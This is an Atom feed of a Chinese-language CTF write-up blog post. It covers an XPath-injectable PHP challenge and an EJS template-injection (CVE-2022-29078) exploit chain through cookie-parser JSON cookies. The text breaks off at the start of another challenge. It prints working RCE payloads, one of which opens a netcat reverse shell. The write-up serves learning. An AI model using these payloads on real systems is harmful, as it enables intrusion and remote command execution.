<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>b1ue0cean&#39;s   blog</title>
  
  <subtitle>welcome to my world -- sharing CTF &amp; ML skills</subtitle>
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2022-08-23T18:36:42.675Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>b1ue0cean</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>palygroundctf2022 writeup</title>
    <link href="http://example.com/2022/08/22/palygroundctf2022/"/>
    <id>http://example.com/2022/08/22/palygroundctf2022/</id>
    <published>2022-08-22T08:48:10.000Z</published>
    <updated>2022-08-23T18:36:42.675Z</updated>
    
    <content type="html"><![CDATA[<p>貌似可以传一个数组过去 然后去读文件？好像不太行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//hint </span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;showsrc&#x27;</span>]) &amp;&amp; <span class="title function_ invoke__">in_array</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;showsrc&#x27;</span>], <span class="title function_ invoke__">Array</span>(<span class="string">&#x27;index.php&#x27;</span>, <span class="string">&#x27;login.php&#x27;</span>, <span class="string">&#x27;library.php&#x27;</span>, <span class="string">&#x27;paperdetail.php&#x27;</span>), <span class="literal">true</span>)) &#123;</span><br><span class="line">                    <span class="title function_ invoke__">highlight_file</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;showsrc&#x27;</span>]);</span><br><span class="line">                &#125;</span><br><span class="line">            <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//login.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line">    <span class="variable">$username</span> = <span class="title function_ invoke__">check_param</span>(<span class="string">&quot;username&quot;</span>);</span><br><span class="line">    <span class="variable">$pwd</span> = <span class="title function_ invoke__">check_param</span>(<span class="string">&quot;pwd&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">checkUser</span>(<span class="variable">$username</span>, <span class="variable">$pwd</span>)) &#123;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&quot;username&quot;</span>] = <span class="variable">$username</span>;</span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: index.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">check_param</span>(<span class="params"><span class="variable">$var</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="variable">$var</span>]) || <span class="variable">$_POST</span>[<span class="variable">$var</span>] === <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">trim</span>(<span class="variable">$_POST</span>[<span class="variable">$var</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">checkUser</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$pwd</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> ((<span class="variable">$username</span> === <span class="string">&quot;&quot;</span>) || (<span class="variable">$pwd</span> === <span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$accounts</span> = @<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;accounts.txt&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$accounts</span> === <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="variable">$users</span> = <span class="keyword">array</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$users</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&quot;\n&quot;</span>, <span class="variable">$accounts</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="title function_ invoke__">array_push</span>(<span class="variable">$users</span>, <span class="string">&quot;guest:&quot;</span>.<span class="title function_ invoke__">hash</span>(<span class="string">&quot;sha256&quot;</span>, <span class="string">&quot;guest&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="variable">$granted</span> = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$users</span> <span class="keyword">as</span> <span class="variable">$each</span>) &#123;</span><br><span class="line">            <span class="variable">$info</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&quot;:&quot;</span>,<span class="variable">$each</span>);</span><br><span class="line">            <span class="keyword">if</span> ( <span class="variable">$username</span> === <span class="title function_ invoke__">trim</span>(<span class="variable">$info</span>[<span class="number">0</span>]) &amp;&amp; <span class="title function_ invoke__">hash</span>(<span class="string">&quot;sha256&quot;</span>, <span class="variable">$pwd</span>) === <span class="title function_ invoke__">trim</span>(<span class="variable">$info</span>[<span class="number">1</span>]) ) &#123;</span><br><span class="line">                <span class="variable">$granted</span> = <span class="literal">true</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$granted</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&quot;username&quot;</span>])) &#123;</span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: login.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">require_once</span> <span class="string">&#x27;library.php&#x27;</span>;</span><br><span class="line">    <span class="variable">$papers</span> = <span class="title function_ invoke__">loadPapers</span>(<span class="string">&#x27;papers.xml&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//library.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$_library_file_name</span> = <span class="string">&#x27;/db/papers.xml&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">loadPapers</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$_library_file_name</span>;</span><br><span class="line">        <span class="variable">$xml</span> = <span class="keyword">new</span> DOMDocument;</span><br><span class="line">        <span class="variable">$xml</span>-&gt;<span class="title function_ invoke__">load</span>(<span class="variable">$_library_file_name</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$xml</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">paperList</span>(<span class="params">DomDocument <span class="variable">$papers</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$xpath</span> = <span class="keyword">new</span> <span class="title class_">DOMXPath</span>(<span class="variable">$papers</span>);</span><br><span class="line">        <span class="variable">$query</span> = <span class="string">&#x27;/Papers/Paper[@published=&quot;yes&quot;]&#x27;</span>;</span><br><span class="line">        <span class="variable">$paper_list</span> = <span class="variable">$xpath</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$query</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$paper_list</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">getFirstChildText</span>(<span class="params">DOMNode <span class="variable">$node</span>, <span class="keyword">string</span> <span class="variable">$tag</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$node</span>-&gt;<span class="title function_ invoke__">getElementsByTagName</span>(<span class="variable">$tag</span>)-&gt;<span class="title function_ invoke__">item</span>(<span class="number">0</span>)-&gt;nodeValue;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">getDetail</span>(<span class="params">DomDocument <span class="variable">$papers</span>, <span class="keyword">string</span> <span class="variable">$idx</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$xpath</span> = <span class="keyword">new</span> <span class="title class_">DOMXPath</span>(<span class="variable">$papers</span>);</span><br><span class="line">        <span class="variable">$query</span> = <span class="string">&quot;//Paper[Idx/text()=&#x27;&quot;</span>.<span class="variable">$idx</span>.<span class="string">&quot;&#x27; and @published=&#x27;yes&#x27;]&quot;</span>;</span><br><span class="line">        <span class="variable">$paper_list</span> = <span class="variable">$xpath</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$query</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$paper_list</span> == <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> [<span class="string">&#x27;status&#x27;</span> =&gt; <span class="string">&#x27;Error&#x27;</span>, <span class="string">&#x27;msg&#x27;</span> =&gt; <span class="string">&#x27;Invalid XPATH expression&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$paper_list</span>-&gt;<span class="title function_ invoke__">count</span>() == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> [<span class="string">&#x27;status&#x27;</span> =&gt; <span class="string">&#x27;Error&#x27;</span>, <span class="string">&#x27;msg&#x27;</span> =&gt; <span class="string">&#x27;No such entity&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$paper</span> = <span class="variable">$paper_list</span>-&gt;<span class="title function_ invoke__">item</span>(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> [</span><br><span class="line">            <span class="string">&#x27;status&#x27;</span> =&gt; <span class="string">&#x27;Success&#x27;</span>, </span><br><span class="line">            <span class="string">&#x27;Title&#x27;</span> =&gt; <span class="title function_ invoke__">getFirstChildText</span>(<span class="variable">$paper</span>, <span class="string">&#x27;Title&#x27;</span>), </span><br><span class="line">            <span class="string">&#x27;Author&#x27;</span> =&gt; <span class="title function_ invoke__">getFirstChildText</span>(<span class="variable">$paper</span>, <span class="string">&#x27;Author&#x27;</span>), </span><br><span class="line">            <span class="string">&#x27;Conference&#x27;</span> =&gt; <span class="title function_ invoke__">getFirstChildText</span>(<span class="variable">$paper</span>, <span class="string">&#x27;Conference&#x27;</span>), </span><br><span class="line">            <span class="string">&#x27;Year&#x27;</span> =&gt; <span class="title function_ invoke__">getFirstChildText</span>(<span class="variable">$paper</span>, <span class="string">&#x27;Year&#x27;</span>), </span><br><span class="line">            <span class="string">&#x27;Abstract&#x27;</span> =&gt; <span class="title function_ invoke__">getFirstChildText</span>(<span class="variable">$paper</span>, <span class="string">&#x27;Abstract&#x27;</span>)</span><br><span class="line">        ];</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//paperdetail.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">require_once</span> <span class="string">&#x27;library.php&#x27;</span>;</span><br><span class="line">    <span class="variable">$papers</span> = <span class="title function_ invoke__">loadPapers</span>(<span class="string">&#x27;papers.xml&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type:application/json&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&quot;username&quot;</span>])) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([<span class="string">&#x27;status&#x27;</span> =&gt; <span class="string">&#x27;Error&#x27;</span>, <span class="string">&#x27;msg&#x27;</span> =&gt; <span class="string">&#x27;Forbidden&#x27;</span>]);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;idx&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>([<span class="string">&#x27;status&#x27;</span> =&gt; <span class="string">&#x27;Error&#x27;</span>, <span class="string">&#x27;msg&#x27;</span> =&gt; <span class="string">&#x27;Invalid Request&#x27;</span>]);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$idx</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;idx&#x27;</span>];</span><br><span class="line">        <span class="variable">$paper</span> = <span class="title function_ invoke__">getDetail</span>(<span class="variable">$papers</span>, <span class="variable">$idx</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$paper</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="JWT-Decoder"><a href="#JWT-Decoder" class="headerlink" title="JWT Decoder"></a>JWT Decoder</h2><h3 id="原型链污染的失败尝试（胡言乱语请直接看solution"><a href="#原型链污染的失败尝试（胡言乱语请直接看solution" class="headerlink" title="原型链污染的失败尝试（胡言乱语请直接看solution"></a>原型链污染的失败尝试（胡言乱语请直接看solution</h3><p>要先打一个原型链污染</p><p>只有JWT这一个输入的地方</p><p><img src="/2022/08/22/palygroundctf2022/MyBlog\b1ue0cean.github.io\source_posts\palygroundctf2022\image-20220822233219673.png" alt="image-20220822233219673"></p><p>怎么说 现在 part0 和 part1 都是进行相同的处理</p><p>唯独 jwtSignature 没有做处理  然后执行了</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> jwtSignature = jwtPart[<span class="number">2</span>];</span><br><span class="line">rawJwt.<span class="property">signature</span> = jwtSignature;</span><br></pre></td></tr></table></figure><p>而我们的ejs 想要执行命令的条件是</p><p>我们要能控制 rawJwt 才行 貌似可以试试</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">res.<span class="keyword">render</span>(<span class="string">&#x27;index&#x27;</span>, rawJwt);</span><br></pre></td></tr></table></figure><p>我要是能注入这个参数就行了</p><p><img src="/2022/08/22/palygroundctf2022/MyBlog\b1ue0cean.github.io\source_posts\palygroundctf2022\image-20220823003059974.png" alt="image-20220823003059974"></p><p>header 和 body 我们必须要能够控制其中之一</p><p><img src="/2022/08/22/palygroundctf2022/MyBlog\b1ue0cean.github.io\source_posts\palygroundctf2022\image-20220823003234438.png" alt="image-20220823003234438"></p><p><strong>但是我们必须要想办法控制键</strong> 很烦</p><p><img src="/2022/08/22/palygroundctf2022/MyBlog\b1ue0cean.github.io\source_posts\palygroundctf2022\image-20220823003343541.png" alt="image-20220823003343541"></p><p>应该是在这里大显神威了</p><p>之前corctf</p><p><img src="/2022/08/22/palygroundctf2022/MyBlog\b1ue0cean.github.io\source_posts\palygroundctf2022\image-20220823004128051.png" alt="image-20220823004128051"></p><p>所以我想 这个cookieParser 会不会有相同的操作</p><p>能变个object传进去</p><p><del>应该只有这个parse 有搞头了</del></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> o1 = &#123;&#125;</span><br><span class="line"><span class="keyword">let</span> o2 = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="string">&#x27;&#123;&quot;a&quot;: 1, &quot;__proto__&quot;: &#123;&quot;b&quot;: 2&#125;&#125;&#x27;</span>)</span><br><span class="line"><span class="title function_">merge</span>(o1, o2)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(o1.<span class="property">a</span>, o1.<span class="property">b</span>)</span><br><span class="line"></span><br><span class="line">o3 = &#123;&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(o3.<span class="property">b</span>)</span><br></pre></td></tr></table></figure><p>左思右想 这里也不符合对象克隆。。。</p><p><img src="/2022/08/22/palygroundctf2022/MyBlog\b1ue0cean.github.io\source_posts\palygroundctf2022\image-20220823013122267.png" alt="image-20220823013122267"></p><p>没什么机会</p><h3 id="CVE-2022-29078"><a href="#CVE-2022-29078" class="headerlink" title="CVE-2022-29078"></a>CVE-2022-29078</h3><p><a href="https://eslam.io/posts/ejs-server-side-template-injection-rce/">EJS, Server side template injection RCE (CVE-2022-29078) - writeup | ~#whoami </a></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exports</span>.<span class="property">render</span> = <span class="keyword">function</span> (<span class="params">template, d, o</span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> data = d || &#123;&#125;;</span><br><span class="line">  <span class="keyword">var</span> opts = o || &#123;&#125;;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// No options object -- if there are optiony names</span></span><br><span class="line">  <span class="comment">// in the data, copy them to options</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="variable language_">arguments</span>.<span class="property">length</span> == <span class="number">2</span>) &#123;</span><br><span class="line">    utils.<span class="title function_">shallowCopyFromList</span>(opts, data, _OPTS_PASSABLE_WITH_DATA);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="title function_">handleCache</span>(opts, template)(data);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>data 和 options 通过<code>utils.shallowCopyFromList</code> 函数被 merge 了</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exports</span>.<span class="property">shallowCopyFromList</span> = <span class="keyword">function</span> (<span class="params">to, <span class="keyword">from</span>, list</span>) &#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; list.<span class="property">length</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">var</span> p = list[i];</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> <span class="keyword">from</span>[p] != <span class="string">&#x27;undefined&#x27;</span>) &#123;</span><br><span class="line">      to[p] = <span class="keyword">from</span>[p];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> to;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>接下来看个例子</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// index.js</span></span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>()</span><br><span class="line"><span class="keyword">const</span> port = <span class="number">3000</span></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;view engine&#x27;</span>, <span class="string">&#x27;ejs&#x27;</span>);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/page&#x27;</span>, <span class="function">(<span class="params">req,res</span>) =&gt;</span> &#123;</span><br><span class="line">    res.<span class="title function_">render</span>(<span class="string">&#x27;page&#x27;</span>, req.<span class="property">query</span>);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(port, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Example app listening on port <span class="subst">$&#123;port&#125;</span>`</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>rce</p><p><code>renderFile</code> function</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Undocumented after Express 2, but still usable, esp. for</span></span><br><span class="line"><span class="comment">// items that are unsafe to be passed along with data, like `root`</span></span><br><span class="line">viewOpts = data.<span class="property">settings</span>[<span class="string">&#x27;view options&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (viewOpts) &#123;</span><br><span class="line">    utils.<span class="title function_">shallowCopy</span>(opts, viewOpts);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>view options</code> ejs will copy everything into the options without restrictions</p><p>what we need is just to find option included in the template body without escaping</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="link">http://localhost:3000/page?id=2&amp;settings</span>[<span class="string">view options</span>][<span class="string">outputFunctionName</span>]=x;process.mainModule.require(<span class="emphasis">&#x27;child_process&#x27;</span>).execSync(<span class="emphasis">&#x27;dir&#x27;</span>);s</span><br></pre></td></tr></table></figure><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="link">http://localhost:3000/page?id=2&amp;settings</span>[<span class="string">view options</span>][<span class="string">outputFunctionName</span>]=x;process.mainModule.require(<span class="emphasis">&#x27;child_process&#x27;</span>).execSync(<span class="emphasis">&#x27;nc -e sh 127.0.0.1 1337&#x27;</span>);s</span><br></pre></td></tr></table></figure><p><img src="/2022/08/22/palygroundctf2022/MyBlog\b1ue0cean.github.io\source_posts\palygroundctf2022\image-20220823002933085.png" alt="image-20220823002933085"></p><p>现在必须要找一个原型链污染 cccccc</p><h3 id="solution"><a href="#solution" class="headerlink" title="solution"></a>solution</h3><p>好了 我们现在已经知道了 想要 rce 就要去控制这个参数 </p><p>但是我们怎么才能去加一个参数呢 从corctf 我们得到了经验 – 如果能通过框架或者某个库来将我们的输入转化成一个object 那我们就有机会</p><p><img src="/2022/08/22/palygroundctf2022/MyBlog\b1ue0cean.github.io\source_posts\palygroundctf2022\image-20220823003343541.png" alt="image-20220823003343541"></p><p>然后我们恰巧有一个没有被过滤的部分    而最有可能出问题的地方就在这里 <code>const cookieParser = require(&#39;cookie-parser&#39;);</code>（这也是这题为什么不直接让你输入 而是让你从cookie输入的原因  如果当时有个师傅跟我讨论下 我可能就不会范这么sb的失误。。。</p><p>然后我们来跟一下 来看看他到底是怎么处理的cookie</p><img src="/2022/08/22/palygroundctf2022/MyBlog\b1ue0cean.github.io\source\_posts\palygroundctf2022\image-20220823225017630.png" alt="image-20220823225017630" style="zoom:50%;"><p>看到这里我们可以看到 这里对JSON类型的cookie有着单独的处理</p><p>我们接着去跟进一下</p><img src="/2022/08/22/palygroundctf2022/MyBlog\b1ue0cean.github.io\source\_posts\palygroundctf2022\image-20220823225116691.png" alt="image-20220823225116691" style="zoom:50%;"><p>可以看到 这里先调用了 <code>JSONCookies</code> 函数 然后又调用了 <code>JSONCookie</code> 函数</p><p>可见 如果以 <code>j:</code> 开头的话    就可以将我们的cookie以json的方式来解析 以获得一个 <code>object</code></p><p>然后我们就可以去构造 payload 了</p><p>原payload</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="link">http://localhost:3000/page?id=2&amp;settings</span>[<span class="string">view options</span>][<span class="string">outputFunctionName</span>]=x;process.mainModule.require(<span class="emphasis">&#x27;child_process&#x27;</span>).execSync(<span class="emphasis">&#x27;nc -e sh 127.0.0.1 1337&#x27;</span>);s</span><br></pre></td></tr></table></figure><p>构造的payload</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">Cookie:</span> jwt = j:&#123;<span class="string">&quot;settings&quot;</span>:&#123;<span class="string">&quot;view options&quot;</span>:&#123;<span class="string">&quot;outputFunctionName&quot;</span>:<span class="string">&quot;x;process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;nc -e sh 127.0.0.1 1337&#x27;);s&quot;</span>&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p>然后我们发现一个小问题 要对<code>;</code>进行编码</p><p>首先来试试url编码</p><p><img src="/2022/08/22/palygroundctf2022/MyBlog\b1ue0cean.github.io\source_posts\palygroundctf2022\image-20220823230543675.png" alt="image-20220823230543675"></p><p>可以看到 <code>;</code> 已经传了进来</p><p>然后监听的端口成功收到</p><h2 id="OnlineEducation"><a href="#OnlineEducation" class="headerlink" title="OnlineEducation"></a>OnlineEducation</h2><blockquote><p>I made an online education service!</p><p>Watching education videos is so boring :(</p><p>Server: <a href="http://onlineeducation.sstf.site/">http://onlineeducation.sstf.site</a></p><p>Download: OnlineEducation.zip</p></blockquote><p>貌似这玩意只和 <code>is_admin</code> 有关？</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">check_name</span>(<span 